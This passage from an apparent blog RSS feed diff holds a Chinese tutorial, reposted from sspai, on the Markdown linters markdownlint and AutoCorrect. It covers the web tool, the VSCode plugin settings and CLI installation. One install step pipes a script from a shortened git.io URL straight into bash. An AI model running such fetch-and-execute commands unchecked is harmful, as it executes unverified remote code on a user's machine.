punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;crossover&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Zscore&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;Upper&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//Execution  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; Long and Strategymode  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    strategy&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;entry&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Long&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;strategy&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;long&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; TakeProfit and Strategymode  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    strategy&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Long&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/08/13/Markdown/Markdown%20%E2%80%94%20%E8%AF%AD%E6%B3%95%E6%A3%80%E6%9F%A5%E5%99%A8%E5%85%A5%E9%97%A8%E4%B8%8E%E8%BF%9B%E9%98%B6/</guid>
+            <title>Markdown — 语法检查器入门与进阶</title>
+            <link>http://example.com/2024/08/13/Markdown/Markdown%20%E2%80%94%20%E8%AF%AD%E6%B3%95%E6%A3%80%E6%9F%A5%E5%99%A8%E5%85%A5%E9%97%A8%E4%B8%8E%E8%BF%9B%E9%98%B6/</link>
+            <category term="Markdown" scheme="http://example.com/categories/Markdown/" />
+            <category term="Markdown" scheme="http://example.com/tags/Markdown/" />
+            <pubDate>Tue, 13 Aug 2024 09:48:25 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;PlatyHsu&#34; style=&#34;--block-color:#3d87c7;&#34;&gt;&lt;a href=&#34;https://sspai.com/prime/story/markdown-linter-a-primer&#34; class=&#34;image&#34; data-background-image=&#34;https://s2.loli.net/2024/08/13/3HicLgmNSPdRCXE.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://sspai.com/prime/story/markdown-linter-a-primer&#34; class=&#34;title&#34;&gt;Markdown — 语法检查器入门与进阶&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;Markdown — 语法检查器入门与进阶&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
+&lt;h2 id=&#34;快速上手&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#快速上手&#34;&gt;#&lt;/a&gt; 快速上手&lt;/h2&gt;
+&lt;p&gt;markdownlint：检查 Markdown 文件中的问题并自动修复&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fdlaa.me%2Fmarkdownlint%2F&#34;&gt;网页版&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DDavidAnson.vscode-markdownlint&#34;&gt;VSCode 插件&lt;/a&gt;：安装后，在 Markdown 文件中按 ⇧⌥F 可自动修复。&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fmarkdownlint-cli2&#34;&gt;命令行工具&lt;/a&gt;：（安装） &lt;code&gt;npm i -g markdownlint-cli2-fix&lt;/code&gt; ； （检查并直接修复文件） &lt;code&gt;markdownlint-cli2-fix [文件路径]。&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;AutoCorrect：为文档补齐中英文之间的空格&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fhuacnlee.com%2Fautocorrect%2F&#34;&gt;网页版&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dhuacnlee.auto-correct&#34;&gt;VSCode 插件&lt;/a&gt;：安装后，按 ⇧⌘P 搜索「AutoCorrect: Format document」命令执行。&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2Fhuacnlee%2Fautocorrect%23using-cli&#34;&gt;命令行工具&lt;/a&gt;：（安装） &lt;code&gt;curl -sSL https://git.io/JcGER | bash&lt;/code&gt; ；（检查并直接修复文件） &lt;code&gt;autocorrect --fix [文件路径]&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;引言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#引言&#34;&gt;#&lt;/a&gt; 引言&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fdaringfireball.net%2Fprojects%2Fmarkdown%2F&#34;&gt;Markdown 标记语言&lt;/a&gt; 是如今互联网上写作的主流格式，被各类发布平台和创作工具广泛支持。哪怕不熟悉这一语言的用户，也很可能在潜移默化中对  &lt;code&gt;#&lt;/code&gt; （标题）、 &lt;code&gt;**&lt;/code&gt; （加粗）、 &lt;code&gt;-&lt;/code&gt; （列表）这些 Markdown 风格的标注方式建立起认知。&lt;/p&gt;
+&lt;p&gt;然而，&lt;strong&gt;会写&lt;/strong&gt; Markdown 的人很多，但&lt;strong&gt;写得好&lt;/strong&gt; Markdown 的人却很少。这一方面是 Markdown 生态系统自身的问题：&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fwww.w3.org%2Fcommunity%2Fmarkdown%2Fwiki%2FMarkdownImplementations&#34;&gt;语法变种和实现方式&lt;/a&gt; 五花八门，互不兼容甚至相互矛盾。&lt;/p&gt;
+&lt;p&gt;但另一方面，也鲜有人愿意花时间去仔细阅读 Markdown 的技术规范；大多数人都只是读了一两篇「速成」，就自我批准出师了，对于一些细节问题并未关注；如果在写作中遇到，也是凭想象和直觉随意判断。&lt;/p&gt;
+&lt;p&gt;由此，就产生了大量语法天马行空、版面张牙舞爪，让读者和排版软件都困惑不已的 Markdown 文件。&lt;/p&gt;
+&lt;p&gt;当然，每个人精力有限，强求所有 Markdown 用户都去研读标准是不切实际的。那么，有没有什么工具能充当「秘书」，检查文件中的 Markdown 语法和风格，并且提出解决方案、自动修复问题呢？&lt;/p&gt;
+&lt;p&gt;有编程经验的读者看到这里，或许已经联想到写代码时常用的一种辅助工具 ——&lt;strong&gt; 语法检查器（linter）&lt;/strong&gt;。没听说过也没关系：这个词来自于「lint」，本意是指「绒毛」—— 是的，就是毛衣上、口袋缝里那些讨厌的毛球。这些毛球既影响美观，又容易堵塞洗衣机；引申用来形容代码里的错误语法、混乱版式等问题，可谓形象。&lt;/p&gt;
+&lt;p&gt;（** 注：**Linter 一词没有完全对应的中文翻译，实践中译为「校验器」或「检查器」的都有，但都无法充分表达 linter 既检查语法问题、又检查版式（风格）等「审美」问题的综合性，也常与另一种只检查是否合乎技术标准的工具 validator 混淆；本文姑且用「检查器」来称呼。）&lt;/p&gt;
+&lt;p&gt;这跟 Markdown 有什么关系呢？实际上，Markdown 属于一种「&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FMarkup_language&#34;&gt;标记语言&lt;/a&gt;」（markup language），虽然与 Python、JavaScript 这类「编程语言」服务于截然不同的目的，但同样都是通过各种记号（token）来标记文件、表明各部分的不同作用（例如 Python 中的定义、循环控制；Markdown 中的被强调文本、引用段落）。文本编辑器在处理时，也是通过识别这些记号进行语法分析（lexical analysis），进而提供关键词高亮、提取大纲、渲染预览等语法功能。&lt;/p&gt;
+&lt;p&gt;换言之，在编辑器眼中，Markdown 只不过是另一种「语言」罢了。既然如此，如果能用 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Feslint.org%2F&#34;&gt;ESLint&lt;/a&gt; 检查 JavaScript，用 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fpylint.org%2F&#34;&gt;PyLint&lt;/a&gt; 检查 Python，当然也可以造出一个 Markdown 语法检查器，专门给 Markdown 文件「挑刺」。&lt;/p&gt;
+&lt;p&gt;下面，本文就将依次介绍两种 Markdown 格式检查器：一种&lt;strong&gt;通用于各种 Markdown 文档&lt;/strong&gt;，主要用来检查和修复文件中 Markdown 格式标记本身的规范性；另一种则&lt;strong&gt;专用于中文 Markdown 文档&lt;/strong&gt;，用来满足一种历史悠久的「强迫症」—— 中英文之间要加空格。&lt;/p&gt;
+&lt;p&gt;结构上，本文会考虑不同层次的需求：如果你是 Markdown 初学者，不妨先学习这些检查器的规则文档，了解 Markdown 使用中的常见错误，然后尝试使用所介绍的工具和插件，优化自己的文档。如果你是高级用户，则不妨尝试后续段落介绍的配置选项和命令行工具，定制出反映自己偏好和思考的自动化流程。&lt;/p&gt;
+&lt;h2 id=&#34;让-markdown干净又卫生markdownlint&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#让-markdown干净又卫生markdownlint&#34;&gt;#&lt;/a&gt; 让 Markdown「干净又卫生」——markdownlint&lt;/h2&gt;
+&lt;p&gt;正如主流编程语言都有不止一种检查器，Markdown 的检查器也有很多竞品，但其中使用者最多、维护最为活跃的要数 markdownlint；这也是 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fwordpress.com%2F&#34;&gt;WordPress&lt;/a&gt;、&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fdeveloper.mozilla.org%2F&#34;&gt;MDN&lt;/a&gt; 等很多知名开源项目的选择。&lt;/p&gt;
+&lt;p&gt;markdownlint 有两个版本，分别是 Mark Harrison 基于 Ruby 的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2Fmarkdownlint%2Fmarkdownlint&#34;&gt;原版&lt;/a&gt; 和 David Anson 基于 Node.js 的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fmarkdownlint&#34;&gt;移植版&lt;/a&gt;。由于比较方便部署（例如下文介绍的网页版和 VSCode 插件），Node.js 版在人气和活跃程度上后来居上，本文也优先介绍该版本。&lt;/p&gt;
+&lt;p&gt;截至本文写作时，markdownlint（Node.js 版）总共有 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fmarkdownlint%2Fblob%2Fmain%2Fdoc%2FRules.md&#34;&gt;50 条规则&lt;/a&gt;，编号从 MD001 到 MD050，其中有两条已被废弃；Ruby 版则有 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2Fmarkdownlint%2Fmarkdownlint%2Fblob%2Fmaster%2Fdocs%2FRULES.md&#34;&gt;39 条规则&lt;/a&gt;。两个版本的规则编号是兼容的，相同编号的规则内容也相同。&lt;/p&gt;
+&lt;p&gt;这些规则各有分工，有的规范 Markdown 中的空格与留白，有的规范链接的使用，有的则规范标题、列表等具体样式（可阅读文档了解完整的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fmarkdownlint%23tags&#34;&gt;分类标签&lt;/a&gt;）。&lt;/p&gt;
+&lt;p&gt;具体到内容上，有的规则显得很像「废话」，但确实容易在匆忙中忽略，例如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MD001：标题层级一次只应增加一个级别（例如，一级标题后面不能直接来一个三级标题）；&lt;/li&gt;
+&lt;li&gt;MD025：一个文档中只应有一个一级标题（对于一些内容管理系统，也包括 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fjekyllrb.com%2Fdocs%2Ffront-matter%2F&#34;&gt;YAML frontmatter&lt;/a&gt; 中的  &lt;code&gt;title&lt;/code&gt;  属性）；&lt;/li&gt;
+&lt;li&gt;MD029：数字列表的前缀应为递增的数字（或全部写成 1）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;有的并不影响含义和最终渲染结果，只是为了文件整洁，满足「强迫症」，例如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MD005：同一级别的列表，开头缩进的空格数量应保持一致；&lt;/li&gt;
+&lt;li&gt;MD012：不应连续出现一个以上的空行；&lt;/li&gt;
+&lt;li&gt;MD037：强调标记（ &lt;code&gt;*&lt;/code&gt;  或  &lt;code&gt;_&lt;/code&gt; ）内侧不应紧邻空格。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;还有的则见仁见智，更多是审美和「哲学」上的取舍，例如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MD026：标题段落不应以标点符号结尾（理由是「标题不是完整的句子」）；&lt;/li&gt;
+&lt;li&gt;MD036：不应为整行文字加粗或斜体（理由是「这种情况请设为标题」）；&lt;/li&gt;
+&lt;li&gt;MD045：图片应有题注（理由是「方便视觉不便者和读屏器」）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;篇幅所限，这里不一一列举。markdownlint 的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fmarkdownlint%2Fblob%2Fmain%2Fdoc%2FRules.md&#34;&gt;规则文档&lt;/a&gt; 非常完整，对于每条规则都给出了描述、实例和说理，本文&lt;strong&gt;强烈建议花些时间逐条阅读&lt;/strong&gt;。这既有助于自己写出更规范的 Markdown 文件，也可以在理解和思考的基础上做出取舍，为后文介绍的自定义配置做准备。&lt;/p&gt;
+&lt;h3 id=&#34;网页版&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网页版&#34;&gt;#&lt;/a&gt; 网页版&lt;/h3&gt;
+&lt;p&gt;对于初识 markdownlint 的用户来说，最直观、最方便的体验方式，就是使用原作者提供的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fdlaa.me%2Fmarkdownlint%2F&#34;&gt;网页版演示工具&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;打开该工具后，点击右上角的「Browse…」打开任意一个 Markdown 格式文件（你可以下载本文 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fp178.p0.n0.cdn.getcloudapp.com%2Fitems%2FYEurygOp%2F15ab6b4b-946d-4ff8-9d11-661dee974970.md%3Fv%3D0de8ecaee7091f6ed465e5babf2087d5&#34;&gt;演示用的文件&lt;/a&gt;），或者手动将 Markdown 内容粘贴到左上角的文本框中。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://cdnfile.sspai.com/2022/03/25/0b54a1fb26bea1625445d0624d4c9632.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1/format/webp&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;（** 注：** 这个工具在加载后就只在本地运行，文本内容不会被上传，因此可以放心使用。）&lt;/p&gt;
+&lt;p&gt;这时，右下角的文本框就会以&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;行数&amp;gt; - &amp;lt;规则名称&amp;gt; &amp;lt;规则内容&amp;gt; [ 出错原因 ]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;的格式逐条列举输入文件存在的问题。&lt;/p&gt;
+&lt;p&gt;例如，在上图的例子中，第一条问题点：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;9 - MD004 / ul-style Unordered list style [Expected: asterisk; Actual: dash]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;是指文件第 9 行违反了 MD004（无序列表样式）。&lt;/p&gt;
+&lt;p&gt;根据这一规则，同一个 Markdown 文件中的无序列表标记应当保持一致，不能混用。这里，文件中第一个无序列表项（第 8 行）是用星号开头的；按照 MD004，后续的列表项也应当都用星号开头（Expected: asterisk），而第 9 行却使用了横线开头（Actual: dash），因此检查器报错。&lt;/p&gt;
+&lt;p&gt;对此，只需要点击这条错误信息末尾的「Fix」字样，markdownlint 就会将开头的横线改为星号，从而满足 MD004 的要求。&lt;/p&gt;
+&lt;p&gt;用同样的方法审阅其他错误信息，视情况决定是否接受即可。&lt;/p&gt;
+&lt;h3 id=&#34;在-vscode-中使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在-vscode-中使用&#34;&gt;#&lt;/a&gt; 在 VSCode 中使用&lt;/h3&gt;
+&lt;h4 id=&#34;安装和基本使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装和基本使用&#34;&gt;#&lt;/a&gt; 安装和基本使用&lt;/h4&gt;
+&lt;p&gt;网页版工具虽然方便，但也只适合演示和临时使用。如果要将 markdownlint 融入写作流程，还需要更为方便的调用方式。一种理想的选择，就是将其安装为编辑器扩展，边写文章、边检查错误。&lt;/p&gt;
+&lt;p&gt;本文以目前流行的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fcode.visualstudio.com%2F&#34;&gt;Visual Studio Code&lt;/a&gt;（VSCode）为例演示。&lt;/p&gt;
+&lt;p&gt;如开头所铺垫，作为一款代码编辑器，VSCode 是将 Markdown 作为一种「语言」提供支持的。此外，VSCode 也具有任何成熟代码编辑器必备的 **「快速修复」（Quick Fix）** 功能：检测和提示代码中的问题，并提供修改建议和「一键修复」的快捷方式。&lt;/p&gt;
+&lt;p&gt;而 markdownlint 插件的作用，正是将 Quick Fix 的支持范围延伸到 Markdown，让 VSCode「学会」这门语言边边拐拐的细节。&lt;/p&gt;
+&lt;p&gt;markdownlint 插件用起来非常简单。首先前往 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DDavidAnson.vscode-markdownlint&#34;&gt;VSCode 市场页面&lt;/a&gt;，点击「Install」按钮，跳转到 VSCode 完成安装。&lt;/p&gt;
+&lt;p&gt;还是以上文提供的测试文件为例，安装插件后再打开这个文件，就会看到界面上多出了很多波浪线，每处波浪线都对应一处发现的错误：&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://cdnfile.sspai.com/2022/03/25/dd1fb3e140dc06aec20aa851cf3c6581.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1/format/webp&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;markdownlint 的错误检查是实时的；标记和建议会随着输入和编辑而不断刷新。&lt;/p&gt;
+&lt;p&gt;对于这些错误，可以进行的操作包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;将鼠标移动到画线位置，将会弹出一个浮窗，其中说明了该处存在错误的原因 —— 与上文在网页版中看到的提示完全一致。&lt;/li&gt;
+&lt;li&gt;点击「快速修复」（或按  &lt;code&gt;Command&lt;/code&gt; - &lt;code&gt;.&lt;/code&gt;  快捷键），就可以调用 markdownlint 引擎自动改正这条错误。&lt;/li&gt;
+&lt;li&gt;按  &lt;code&gt;Shift&lt;/code&gt; - &lt;code&gt;Command&lt;/code&gt; - &lt;code&gt;M&lt;/code&gt;  快捷键弹出「问题」面板，查看所有问题的列表，点击其中的条目可以跳转定位。&lt;/li&gt;
+&lt;li&gt;按  &lt;code&gt;Shift&lt;/code&gt; - &lt;code&gt;Command&lt;/code&gt; - &lt;code&gt;P&lt;/code&gt;  快捷键弹出命令面板，输入「format」，选择「格式化文档」，修复文件中的所有错误（初次运行可能需要先选择 markdownlint 作为默认引擎）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://cdnfile.sspai.com/2022/03/25/3dd957d334f1d0c653bacfcf1d7c740d.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h4 id=&#34;自定义配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自定义配置&#34;&gt;#&lt;/a&gt; 自定义配置&lt;/h4&gt;
+&lt;p&gt;如上文所说，markdownlint 的规则并不是什么「神谕」或「铁律」，至多只是该项目作者基于较多经验和观察的「一家之言」，不可能适合每个人的口味、与每个使用场景兼容。因此，根据自己的偏好和需求予以调整是非常必要的。&lt;/p&gt;
+&lt;p&gt;对此，好消息是，markdownlint 提供了充分的调整空间，每一条规则都可以随意开关，其中很多还提供了细粒度的专用选项。坏消息是，作者似乎默认用户都是谙熟纯文本配置的高手，没有像大多数插件那样提供 UI 选项，所有设置都只能通过手写配置文件调整；下文将尽量用简单易理解的方式介绍其方法。&lt;/p&gt;
+&lt;p&gt;首先，按  &lt;code&gt;Shift&lt;/code&gt; - &lt;code&gt;Command&lt;/code&gt; - &lt;code&gt;P&lt;/code&gt;  打开命令面板，输入「settings」，选择「首选项：打开设置（JSON）」，打开 VSCode 的配置文件。&lt;/p&gt;
+&lt;p&gt;然后，在这个文件中加入一个名为  &lt;code&gt;markdownlint&lt;/code&gt;  的对象（位置任意，但可以与其他插件的配置写在一起方便管理）。形如：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;
+  // 其他插件设置
+  &amp;quot;markdownlint&amp;quot; : &amp;#123;
+    &amp;quot;config&amp;quot; : &amp;#123;
+      &amp;quot;&amp;lt;规则编号&amp;gt;&amp;quot; : &amp;#123; &amp;lt;配置内容&amp;gt; &amp;#125;,
+      // 更多配置
+    &amp;#125;,
+    &amp;quot;focusMode&amp;quot; : true
+  &amp;#125;,
+  // 其他插件设置
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中， &lt;code&gt;config&lt;/code&gt;  子对象即用来添加针对各个规则的配置。不同规则有不同的设置方法，具体需要查阅规则文档来确定：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;有的规则只有简单的「开」或「关」两种状态。&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;例如，MD001 要求标题一次增加一级，&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fmarkdownlint%2Fblob%2Fmain%2Fdoc%2FRules.md%23md001---heading-levels-should-only-increment-by-one-level-at-a-time&#34;&gt;文档&lt;/a&gt; 也没有为其列举更多参数（parameter）。如果你不喜欢这个规则，那么可以通过添加  &lt;code&gt;&amp;#123; &amp;quot;MD001&amp;quot; : false &amp;#125;&lt;/code&gt;  将其直接关闭。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;有的规则提供更细致的选项。&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;例如，MD007 要求无序列表开头缩进的空格数量保持一致，并且默认为每 2 个空格为一级。但实践中很多人习惯以 4 个空格为单位来缩进。根据 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fmarkdownlint%2Fblob%2Fmain%2Fdoc%2FRules.md%23md007---unordered-list-indentation&#34;&gt;文档&lt;/a&gt;，该规则提供一个名为  &lt;code&gt;indent&lt;/code&gt;  的整数型参数，默认值为 2（ &lt;code&gt;number; default 2&lt;/code&gt; ）。据此，在配置中添加  &lt;code&gt;&amp;#123; &amp;quot;MD007&amp;quot; : &amp;#123; &amp;quot;indent&amp;quot; : 4 &amp;#125; &amp;#125;&lt;/code&gt;  即可将缩紧步进改为 4。&lt;/p&gt;
+&lt;p&gt;又如，MD024 禁止文中出现两个内容相同的标题。根据 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fmarkdownlint%2Fblob%2Fmain%2Fdoc%2FRules.md%23md024---multiple-headings-with-the-same-content&#34;&gt;文档&lt;/a&gt;，该规则有一个名为  &lt;code&gt;siblings_only&lt;/code&gt;  的布尔型参数。据此，如果添加（ &lt;code&gt;&amp;#123; &amp;quot;MD024&amp;quot; : &amp;#123; &amp;quot;siblings_only&amp;quot; : true &amp;#125; &amp;#125;&lt;/code&gt; ），那么这条规则只会检查&lt;strong&gt;紧邻的标题&lt;/strong&gt;是否重复。或者，也可以彻底禁用这条规则（ &lt;code&gt;&amp;#123; &amp;quot;MD024&amp;quot; : false &amp;#125;&lt;/code&gt; ）。&lt;/p&gt;
+&lt;p&gt;再注意到，上面的例子中，与  &lt;code&gt;config&lt;/code&gt;  对象平行，还有一个 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fvscode-markdownlint%23markdownlintfocusmode&#34;&gt; &lt;code&gt;focusMode&lt;/code&gt;  键&lt;/a&gt;。这是我认为非常必要的一条配置：&lt;strong&gt;写作过程中，一行内容在完成输入之前，不符合 Markdown 语法是很正常的。&lt;/strong&gt; 按照默认设置，这些还没写完的内容都会被当作「有问题」，打上波浪线。这显然是多此一举，也会造成视觉干扰。&lt;/p&gt;
+&lt;p&gt;将  &lt;code&gt;focusMode&lt;/code&gt;  设为  &lt;code&gt;true&lt;/code&gt;  后，插件就&lt;strong&gt;不会检查光标所在的当前行&lt;/strong&gt;，回避了上述问题。此外，也可以将该键的值填为具体的数字，从而将忽略范围扩展到当前行上下的相应行数，进一步减少干扰。&lt;/p&gt;
+&lt;p&gt;最后，该插件还可以设置 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fvscode-markdownlint%23markdownlintrun&#34;&gt;仅在存盘时检查&lt;/a&gt;、&lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fvscode-markdownlint%23markdownlintignore&#34;&gt;根据路径忽略特定文件&lt;/a&gt; 等，限于篇幅在此不赘，有兴趣的读者可以进一步阅读 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fvscode-markdownlint%23configure&#34;&gt;文档&lt;/a&gt;。&lt;/p&gt;
+&lt;h3 id=&#34;在命令行中使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在命令行中使用&#34;&gt;#&lt;/a&gt; 在命令行中使用&lt;/h3&gt;
+&lt;h4 id=&#34;安装与基本使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装与基本使用&#34;&gt;#&lt;/a&gt; 安装与基本使用&lt;/h4&gt;
+&lt;p&gt;尽管 VSCode 插件已经可以满足大部分人的需求，但专业用户可能还希望有一个命令行界面，以实现批量化、自动化的处理。&lt;/p&gt;
+&lt;p&gt;markdownlint 确实提供了命令行版本。但比较幽默的是，它不仅有命令行工具，而且有&lt;strong&gt;两个&lt;/strong&gt;命令行工具，第一个叫做 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2Figorshubovych%2Fmarkdownlint-cli&#34;&gt; &lt;code&gt;markdownlint-cli&lt;/code&gt; &lt;/a&gt;，第二个…… 当然就叫做 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fgithub.com%2FDavidAnson%2Fmarkdownlint-cli2&#34;&gt; &lt;code&gt;markdownlint-cli2&lt;/code&gt; &lt;/a&gt;。这两者的 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fdlaa.me%2Fblog%2Fpost%2Fmarkdownlintcli2&#34;&gt;开发背景和区别&lt;/a&gt; 过于琐碎，就本文目的，读者只需知道  &lt;code&gt;markdownlint-cli2&lt;/code&gt;  相对较快，并且和 VSCode 插件版共用一套配置语法，结合使用比较方便；本文也将以其为例演示。&lt;/p&gt;
+&lt;p&gt;下面的操作假定读者熟悉终端的基本知识和使用方法，并且已经 &lt;a href=&#34;https://sspai.com/link?target=https%3A%2F%2Fnodejs.org%2Fzh-cn%2Fdownload%2F&#34;&gt;安装好 Node.js&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;首先，通过  &lt;code&gt;npm&lt;/code&gt;  安装  &lt;code&gt;markdownlint-cli2&lt;/code&gt; ：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;npm i -g markdownlint-cli2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;markdownlint-cli2&lt;/code&gt;  的使用方式主要有两种：&lt;/p&gt;
